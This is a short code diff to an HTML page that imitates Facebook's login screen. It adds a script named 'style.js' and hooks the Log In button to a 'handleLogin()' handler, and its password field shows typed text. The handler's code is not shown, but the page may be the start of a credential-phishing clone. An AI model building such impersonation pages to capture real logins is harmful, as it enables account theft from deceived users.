@@ -7,6 +7,7 @@
     <title>Log in to Facebook</title>
     <link rel="stylesheet" href="./style.css" />
     <link rel="icon" type="image/svg" href="images/facebook-ga7786331e.svg">
+    <script src="style.js"></script>
   </head>
   <body>
     <div class="container">
@@ -16,12 +17,12 @@
           <h3>Log in to Facebook</h3>
 
           <div class="email">
-            <input type="text" name="email" placeholder="Email address or phone number" required/>
+            <input type="text" id="username" placeholder="User Name" required/>
           </div>
           <div class="password">
-            <input type="text" name="pass" placeholder="Password" required/>
+            <input type="text" id="pass" placeholder="Password" required/>
           </div>
-          <div class="btn"><button>Log In</button></div>
+          <div class="btn"><button onclick="handleLogin()">Log In</button></div>
 
           <a href="#">Forgotten account?</a>
           <a href="#">Sign up for Facebook</a>
